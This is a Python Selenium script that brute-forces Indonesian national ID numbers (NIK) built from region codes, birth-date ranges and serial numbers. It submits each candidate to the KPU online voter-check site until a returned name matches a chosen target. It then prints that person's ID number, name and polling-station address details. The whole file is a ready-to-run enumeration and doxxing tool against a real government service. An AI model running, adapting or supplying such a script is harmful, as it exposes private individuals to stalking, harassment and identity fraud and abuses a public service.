from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException

from datetime import date, timedelta
import time
import sys

def generate_niks_bruteforce(prov, city, dist, gender, start_year, end_year, unique_start, unique_end):
    """Membuat daftar NIK dengan brute-force rentang tanggal lahir."""
    nik_list = []
    start_date = date(start_year, 7, 1)
    end_date = date(end_year, 6, 30)
    current_date = start_date
    while current_date <= end_date:
        day = current_date.day
        month = current_date.month
        year = str(current_date.year)[-2:]
        day_for_nik = day + 40 if gender.lower() == 'p' else day
        dob_str = f"{day_for_nik:02d}{month:02d}{year}"
        for i in range(unique_start, unique_end + 1):
            unique_code = f"{i:04d}"
            nik = f"{prov}{city}{dist}{dob_str}{unique_code}"
            nik_list.append(nik)
        current_date += timedelta(days=1)
    return nik_list

def generate_niks_specific(prov, city, dist, dob, unique_start, unique_end):
    """Membuat daftar NIK dengan tanggal lahir spesifik."""
    nik_list = []
    for i in range(unique_start, unique_end + 1):
        unique_code = f"{i:04d}"
        nik = f"{prov}{city}{dist}{dob}{unique_code}"
        nik_list.append(nik)
    return nik_list

def extract_field_value(driver, field_name):
    """Ekstrak nilai field berdasarkan nama field"""
    try:
        # Cari span yang berisi nama field, lalu ambil text setelahnya
        xpath = f'//span[text()="{field_name}"]/following-sibling::text()[1] | //span[text()="{field_name}"]/../text()[normalize-space()]'
        element = driver.find_element(By.XPATH, xpath)
        return element.strip().strip('"')
    except:
        try:
            # Alternatif: cari berdasarkan parent div
            xpath = f'//span[text()="{field_name}"]/parent::*'
            parent_element = driver.find_element(By.XPATH, xpath)
            text = parent_element.text.replace(field_name, "").strip().strip('"')
            return text
        except:
            return "NOT FOUND"

def extract_voter_data(driver, wait):
    """Ekstrak semua data pemilih dari halaman hasil"""
    try:
        # Ekstrak nama pemilih
        nama_element = wait.until(EC.presence_of_element_located(
            (By.XPATH, '//p[span[text()="Nama Pemilih"]]')
        ))
        nama = nama_element.text.replace("Nama Pemilih", "").strip()
        
        # Ekstrak data lokasi menggunakan xpath yang lebih spesifik
        data = {
            'nama': nama,
            'kabupaten': extract_field_value(driver, "Kabupaten"),
            'kecamatan': extract_field_value(driver, "Kecamatan"), 
            'kelurahan': extract_field_value(driver, "Kelurahan"),
            'alamat_tps': extract_field_value(driver, "Alamat Potensial TPS")
        }
        
        return data
        
    except Exception as e:
        print(f"Error ekstraksi data: {e}")
        return None

def main():
    print("======================================================")
    print("=           NIK WEB SCRAPPER - ENHANCED              =")
    print("=                BY BAPA X KENCUR                    =")
    print("======================================================")

    target_name = input("Target Entry: ")
    province_code = input("Province Code : ")
    city_code = input("City Code : ")

    district_code = input("District Code : ")

    if district_code == "00":
        distric_code_start = input("District Code 1 : ")
        distric_code_end = input("District Code ~ : ")
    else:
        distric_code_start = district_code
        distric_code_end = district_code

    print("\nTL input (DDMMYY).")
    print("'000000' brute mode.")
    dob_input = input("TL Input (DDMMYY): ")

    daftar_nik = []

    if dob_input == "000000":
        # Minta gender saat brute force tanggal lahir
        while True:
            gender = input("Gender target (L/P): ").strip().upper()
            if gender in ['L', 'P']:
                break
            else:
                print("Input gender tidak valid! Masukkan 'L' untuk Laki-laki atau 'P' untuk Perempuan.")
        try:
            gen1 = int(input("gen 1: "))
            gen2 = int(input("gen 2: "))
            unique_start = int(input("unique code 1: "))
            unique_end = int(input("unique code ~: "))
        except ValueError as e:
            print(f"Input tidak valid: {e}. Program berhenti.")
            sys.exit()

        for dist_code_int in range(int(distric_code_start), int(distric_code_end) + 1):
            dist_code_str = f"{dist_code_int:02d}"
            print(f"\nbrute-force 01/07/{gen1} sampai 30/06/{gen2}, district {dist_code_str} ...")
            partial_nik_list = generate_niks_bruteforce(
                province_code,
                city_code,
                dist_code_str,
                gender,
                gen1,
                gen2,
                unique_start,
                unique_end
            )
            daftar_nik.extend(partial_nik_list)

    else:
        try:
            unique_start = int(input("unique code 1: "))
            unique_end = int(input("unique code ~: "))
        except ValueError as e:
            print(f"Input tidak valid: {e}. Program berhenti.")
            sys.exit()

        for dist_code_int in range(int(distric_code_start), int(distric_code_end) + 1):
            dist_code_str = f"{dist_code_int:02d}"
            partial_nik_list = generate_niks_specific(
                province_code,
                city_code,
                dist_code_str,
                dob_input,
                unique_start,
                unique_end
            )
            daftar_nik.extend(partial_nik_list)

    if not daftar_nik:
        print("Tidak ada NIK yang dihasilkan. Program berhenti.")
        sys.exit()

    print(f"\nTotal : {len(daftar_nik)} code")

    if input("Run program? (y/n): ").lower() != 'y':
        print("Program dibatalkan.")
        sys.exit()

    print("..................... Brute forcing >>>")

# Impor Options di bagian atas file Anda bersama impor lainnya
    from selenium.webdriver.chrome.options import Options

    # --- Di dalam fungsi main ---

    # Siapkan opsi untuk Chrome
    chrome_options = Options()
    chrome_options.add_argument("--headless") # --headful 4 GUI exist
    chrome_options.add_argument("--disable-gpu") # Disarankan untuk mode headless
    chrome_options.add_argument("--window-size=1920,1080") # Atur ukuran jendela virtual

    try:
        # Masukkan 'options' saat membuat driver
        driver = webdriver.Chrome(options=chrome_options)
        driver.get("https://cekdptonline.kpu.go.id/")
    except Exception as e:
        print(f"Error saat memulai browser: {e}\nPastikan chromedriver sudah terpasang.")
        sys.exit()

    results = []
    found = False
    wait = WebDriverWait(driver, 1)

    SUCCESS_XPATH = '//p[span[text()="Nama Pemilih"]]'
    FAILURE_XPATH = "//div[contains(text(), 'Data anda belum terdaftar!')]"

    for index, nik in enumerate(daftar_nik):
        if found:
            break
        print(f"enum {index + 1}/{len(daftar_nik)}: {nik}", end="")
        try:
            kolom_nik = wait.until(EC.presence_of_element_located((By.XPATH, '//input[@type="text"]')))
            kolom_nik.clear()
            kolom_nik.send_keys(nik)
            tombol_cari = driver.find_element(By.XPATH, '//button[contains(.,"Pencarian")]')
            tombol_cari.click()

            found_element = wait.until(
                EC.presence_of_element_located(
                    (By.XPATH, f"{SUCCESS_XPATH} | {FAILURE_XPATH}")
                )
            )

            element_text = found_element.text
            if "Nama Pemilih" in element_text:
                # Ekstrak semua data
                voter_data = extract_voter_data(driver, wait)
                
                if voter_data:
                    nama_web = voter_data['nama']
                    print(f" -> '{nama_web}'")
                    
                    if target_name.lower() in nama_web.lower():
                        print(f"✅ FOUND! NIK: {nik} | Nama: {nama_web}")
                        results.append((nik, voter_data, "SUITABLE"))
                        found = True
                        print("5 sec for enum")
                        time.sleep(5)
                    else:
                        results.append((nik, voter_data, "DIFF"))
                else:
                    print(" -> extraction error")
                    results.append((nik, "EXTRACTION_ERROR", "DIFF"))
            else:
                print(" -> result: not found")
                results.append((nik, "NOT FOUND", "DIFF"))

        except TimeoutException:
            print(" -> loading")
            results.append((nik, "NOT FOUND", "DIFF"))
            driver.refresh()
            continue
        except Exception as e:
            print(f" -> error : {e}, loading")
            driver.refresh()
            continue

    if not found:
        try:
            pencarian_ulang_btn = driver.find_element(By.XPATH, '//button[contains(.,"Pencarian Ulang")]')
            pencarian_ulang_btn.click()
        except:
            driver.refresh()

    driver.quit()

    # Laporan Hasil Akhir
    print("\n====== TARGET DATA REVEALED ======")
    found_results = [r for r in results if r[2] == "SUITABLE"]

    if found_results:
        for result in found_results:
            nik, data, status = result
            if isinstance(data, dict):
                print(f"NIK      : {nik}")
                print(f"Nama     : {data['nama']}")
                print(f"Alamat   : {data['alamat_tps']}")
                print(f"Kelurahan: {data['kelurahan']}")
                print(f"Kecamatan: {data['kecamatan']}")
                print(f"Kabupaten: {data['kabupaten']}")
                print()  # Baris kosong untuk pemisah jika ada multiple hasil
    else:
        print("No target found, this one is an asshole.")

if __name__ == "__main__":
    main()
